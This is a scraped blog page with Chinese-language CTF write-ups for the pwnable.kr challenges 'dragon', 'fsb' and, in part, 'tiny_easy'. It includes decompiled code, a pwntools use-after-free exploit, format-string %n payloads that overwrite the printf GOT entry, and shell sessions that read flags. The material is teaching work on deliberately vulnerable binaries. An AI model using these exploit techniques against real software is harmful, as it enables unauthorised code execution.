(*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr)(ptr);</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">int</span>))(a1 + <span class="number">12</span>))(a1);</span><br><span class="line">    v2 = GetChoice();</span><br><span class="line">    <span class="keyword">switch</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Clarity! Your Mana Has Been Refreshed"</span>);</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">50</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"But The Dragon Deals %d Damage To You!\n"</span>, *((_DWORD *)ptr + <span class="number">3</span>));</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">4</span>) -= *((_DWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"And The Dragon Heals %d HP!\n"</span>, *((_BYTE *)ptr + <span class="number">9</span>));</span><br><span class="line">        *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">8</span>) &lt;= <span class="number">24</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Not Enough MP!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"HolyShield! You Are Temporarily Invincible..."</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"But The Dragon Heals %d HP!\n"</span>, *((_BYTE *)ptr + <span class="number">9</span>));</span><br><span class="line">          *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>) -= <span class="number">25</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">8</span>) &lt;= <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Not Enough MP!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Holy Bolt Deals %d Damage To The Dragon!\n"</span>, <span class="number">20</span>);</span><br><span class="line">          *((_BYTE *)ptr + <span class="number">8</span>) -= <span class="number">20</span>;</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>) -= <span class="number">10</span>;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"But The Dragon Deals %d Damage To You!\n"</span>, *((_DWORD *)ptr + <span class="number">3</span>));</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">4</span>) -= *((_DWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"And The Dragon Heals %d HP!\n"</span>, *((_BYTE *)ptr + <span class="number">9</span>));</span><br><span class="line">          *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">4</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)ptr + <span class="number">8</span>) &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SecretLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [sp+12h] [bp-16h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to Secret Level!\nInput Password : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%10s"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">"Nice_Try_But_The_Dragons_Won't_Let_You!"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>贴了几个关键的函数反编译代码，程序逻辑就不细说了，下面只记录关键部分。<br>在<code>SecretLevel</code>函数中有一段执行shell的代码，但是没办法绕过判断。程序的漏洞在<code>PriestAttack</code>函数内，该函数在怪物的血量不大于0时跳出循环，但是记录怪物血量的变量是<code>BYTE</code>类型的，也就是<code>unsigned char</code>类型。与它比较的0默认情况是<code>signed int</code>。<br>在c语言中不同类型的变量做比较会进行隐式类型转换，短长度类型会向较长长度类型转换，长度一致符号不同则向无符号转换，整数会向float转换，float会向double转换。这些网上都能搜到，所以就不继续说了。<br>那么这里的比较，<code>BYTE</code>就会向<code>signed int</code>转换。如果此时怪物血量为<code>128</code>,转换为二进制就是<code>10000000</code>,那么进行符号扩展时就变成了<code>0xffffff80</code>,而这个数其符号位为<code>1</code>所以是个负数，那么函数就会跳出循环并返回<code>1</code>。然而使怪物的血量达到<code>128</code>是可行的，可以使用第一个英雄挑战<code>Mama Dragon</code>，每个回合配合使用<code>3</code>和<code>2</code>技能使怪物自动增长血量，最后就能使怪物血量达到128。<br>接下来就是游戏胜利的判断了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Well Done Hero! You Killed The Dragon!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The World Will Remember You As:"</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And The Dragon You Have Defeated Was Called:"</span>);</span><br><span class="line">  ((<span class="keyword">void</span> (__cdecl *)(_DWORD *))*v5)(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>进入该判断后，由于在前面的函数中<code>v5</code>这个堆指针已经释放了但是没有置0，这里马上又申请了一个大小一样的堆空间，那么根据glibc的堆分配策略这里的<code>v2</code>会引用之前<code>v5</code>指向的堆，接下来<code>v2</code>的内容可控下面又有<code>v5</code>函数的调用，所以就可以写入任意地址来执行了。这里算是一个<code>UAF</code>漏洞。<br>知道了利用方法下面给出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./dragon'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9004</span>)</span><br><span class="line">        </span><br><span class="line">    target_addr = <span class="number">0x08048dbf</span></span><br><span class="line">    </span><br><span class="line">    r.send(<span class="string">"1\n"</span>*<span class="number">3</span>+<span class="string">'1\n'</span>+<span class="string">"3\n3\n2\n"</span>*<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"You As:\n"</span>)</span><br><span class="line">    r.sendline(p32(target_addr))</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9004: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">And The Dragon You Have Defeated Was Called:</span><br><span class="line">$ ls</span><br><span class="line">dragon</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">MaMa, Gandhi was right! :)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在c语言编码时得注意不同类型变量的比较，很有可能在隐式转换时造成漏洞。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/02/27/pwnable.kr-fsb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/pwnable.kr-fsb/" itemprop="url">
                  pwnable.kr-fsb
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-27 14:04:54" itemprop="dateCreated datePublished" datetime="2018-02-27T14:04:54+08:00">2018-02-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/27/pwnable.kr-fsb/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/27/pwnable.kr-fsb/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/27/pwnable.kr-fsb/" class="leancloud_visitors" data-flag-title="pwnable.kr-fsb">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一道考察<code>printf</code>格式化字符串漏洞利用的题目，总的来说很简单，但是我却花了很长时间，主要是我有点太马虎没仔细分析代码，笑哭。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析源代码<code>fsb.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsb</span><span class="params">(<span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* args[]=&#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>*** pargv = &amp;argv;</span><br><span class="line">	<span class="keyword">char</span>*** penvp = &amp;envp;</span><br><span class="line">        <span class="keyword">char</span>** arg;</span><br><span class="line">        <span class="keyword">char</span>* c;</span><br><span class="line">        <span class="keyword">for</span>(arg=argv;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">for</span>(arg=envp;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">	*pargv=<span class="number">0</span>;</span><br><span class="line">	*penvp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Give me some format strings(%d)\n"</span>, i+<span class="number">1</span>);</span><br><span class="line">		read(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line">		<span class="built_in">printf</span>(buf);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wait a sec...\n"</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"key : \n"</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf2, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pw = strtoull(buf2, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(pw == key)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">                execve(args[<span class="number">0</span>], args, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect key \n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>( fd==<span class="number">-1</span> || read(fd, &amp;key, <span class="number">8</span>) != <span class="number">8</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	alloca(<span class="number">0x12345</span> &amp; key);</span><br><span class="line"></span><br><span class="line">	fsb(argv, envp); <span class="comment">// exploit this format string bug!</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序先获得一个8字节的随机数存于全局变量<code>key</code>中，然后调用<code>alloca</code>函数在栈上分配内存。之后调用<code>fsb</code>函数。在这个函数内部要想达到<code>exeve</code>函数执行shell，就必须输入正确的<code>key</code>值。<br>这个<code>fsb</code>函数在<code>printf(buf)</code>处存在格式化字符串漏洞，关于漏洞利用网上有很多就不罗嗦了。那么要getshell其实方法有很多，可以改写<code>got</code>表也可以<code>leak</code>出key的值。这里直接改写<code>got</code>表好了，可以把<code>printf</code>的地址改写为要执行shell的地址，这样当执行<code>printf</code>时就跳到shell中了。<br>下面是exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//各种地址和偏移在反汇编代码中就可以看出来，就不一一分析了</span><br><span class="line">%134520836c%14<span class="variable">$n</span> //把<span class="built_in">printf</span>的got表地址写入fsb函数的第一个参数中（方法很多你可以写到栈上的很多位置）</span><br><span class="line">%134514347c%20<span class="variable">$n</span> //向<span class="built_in">printf</span>的got表写入要执行shell的地址</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fsb@ubuntu:~$ ./fsb &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">%134520836c%14<span class="variable">$n</span></span><br><span class="line">%134514347c%20<span class="variable">$n</span></span><br><span class="line">cat flag &gt;/tmp/flag</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">fsb@ubuntu:~$ cat /tmp/flag</span><br><span class="line">Have you ever saw an example of utilizing [n] format character?? :(</span><br><span class="line">fsb@ubuntu:~$</span><br></pre></td></tr></table></figure>
<p>要注意的是需要把程序的标准输出和错误输出重定向到<code>/dev/null</code>，这样就不会因为输出数据过多而卡死了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是简单的格式化字符串漏洞的题目，利用方法很多，当时因为一直想通过<code>alloca</code>函数来计算<code>key</code>而浪费了很多时间，然而这样计算出来的只是前4字节，唉要细心啊。。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/02/26/pwnable.kr-tiny_easy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/26/pwnable.kr-tiny_easy/" itemprop="url">
                  pwnable.kr-tiny_easy
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-26 21:00:19" itemprop="dateCreated datePublished" datetime="2018-02-26T21:00:19+08:00">2018-02-26</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/26/pwnable.kr-tiny_easy/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/26/pwnable.kr-tiny_easy/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/26/pwnable.kr-tiny_easy/" class="leancloud_visitors" data-flag-title="pwnable.kr-tiny_easy">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考验漏洞利用能力的题目，长姿势了。参考了别人的<a href="https://blog.yiz96.com/pwnable-kr-tiny_easy/" target="_blank" rel="noopener">writeup</a></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>没有源代码，就丢ida逆向了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048054 ; Attributes: noreturn</span><br><span class="line">LOAD:08048054</span><br><span class="line">LOAD:08048054                 public start</span><br><span class="line">LOAD:08048054 start           proc near</span><br><span class="line">LOAD:08048054                 pop     eax</span><br><span class="line">LOAD:08048055                 pop     edx</span><br><span class="line">LOAD:08048056                 mov     edx, [edx]</span><br><span class="line">LOAD:08048058                 call    edx</span><br><span class="line">LOAD:08048058 start           endp ; sp-analysis failed</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058 LOAD            ends</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058                 end start</span><br></pre></td></tr></table></figure></p>
<p>这是什么程序？？就这一点代码就什么都没了？当时也很蒙蔽，不过漏洞还是很容易看出来的。<code>call</code>调用其实是可以通过栈内数据控制的，但是栈上的数据是什么呢？丢进<code>gdb</code>看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   0x8048050:	add    BYTE PTR [eax],dl</span><br><span class="line">   0x8048052:	add    BYTE PTR [eax],al</span><br><span class="line">=&gt; 0x8048054:	pop    eax</span><br><span class="line">   0x8048055:	pop    edx</span><br><span class="line">   0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">   0x8048058:	call   edx</span><br><span class="line">   0x804805a:	add    BYTE PTR [eax],al</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffcf23c0 --&gt; 0x1 </span><br><span class="line">0004| 0xffcf23c4 --&gt; 0xffcf32bb (&quot;/root/桌面/test/tiny_easy&quot;)</span><br><span class="line">0008| 0xffcf23c8 --&gt; 0x0 </span><br><span class="line">0012| 0xffcf23cc --&gt; 0xffcf32db (&quot;XDG_VTNR=7&quot;)</span><br><span class="line">0016| 0xffcf23d0 --&gt; 0xffcf32e6 (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0020| 0xffcf23d4 --&gt; 0xffcf32f8 (&quot;XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/gyh&quot;)</span><br><span class="line">0024| 0xffcf23d8 --&gt; 0xffcf3327 (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class="line">0028| 0xffcf23dc --&gt; 0xffcf333d (&quot;GPG_AGENT_INFO=/home/gyh/.gnupg/S.gpg-agent:0:1&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048054 in ?? ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p>
